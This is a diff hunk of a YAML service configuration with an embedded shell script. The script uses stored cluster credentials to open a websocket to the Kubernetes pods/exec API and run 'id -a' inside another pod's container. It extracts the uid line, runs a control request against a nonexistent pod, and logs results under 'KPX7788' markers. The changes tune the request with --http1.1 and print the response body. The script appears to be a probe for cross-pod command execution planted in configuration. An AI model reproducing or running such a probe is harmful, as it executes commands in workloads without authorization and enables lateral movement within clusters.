@@ -23,10 +23,10 @@ service:
           echo "KPX7788-TARGET-POD=$PODNAME  CONTAINERS=$CONTS"
           C1=$(echo $CONTS | cut -d, -f1)
           KEY=$(head -c 16 /dev/urandom | base64)
-          echo "KPX7788-EXEC-STATUS=$(curl -s -o /tmp/x -D /tmp/xh -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt -N --max-time 20 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/$PODNAME/exec?container=$C1&command=id&command=-a&stdout=true&stderr=true")"
-          echo "KPX7788-EXEC-HEADERS:"; head -c 300 /tmp/xh
+          echo "KPX7788-EXEC-STATUS=$(curl -s -o /tmp/x -D /tmp/xh -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --http1.1 -N --max-time 20 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/$PODNAME/exec?container=$C1&command=id&command=-a&stdout=true&stderr=true")"
+          echo "KPX7788-EXEC-HEADERS:"; head -c 300 /tmp/xh; echo "KPX7788-EXEC-BODY:"; head -c 250 /tmp/x
           echo "KPX7788-EXEC-UID-LINE:"; strings /tmp/x 2>/dev/null | grep -aoE 'uid=[0-9]+\([a-z]+\)[^ ]*' | head -3
           echo "KPX7788-EXEC-BYTES=$(wc -c < /tmp/x)"
-          echo "KPX7788-CONTROL-NOPOD=$(curl -s -o /dev/null -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --max-time 15 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/kp-nonexistent-pod-7788/exec?command=id&stdout=true")"
+          echo "KPX7788-CONTROL-NOPOD=$(curl -s -o /dev/null -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --http1.1 --max-time 15 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/kp-nonexistent-pod-7788/exec?command=id&stdout=true")"
           rm -f /tmp/kc /tmp/pods /tmp/x /tmp/xh
           echo "KPX7788-DONE"
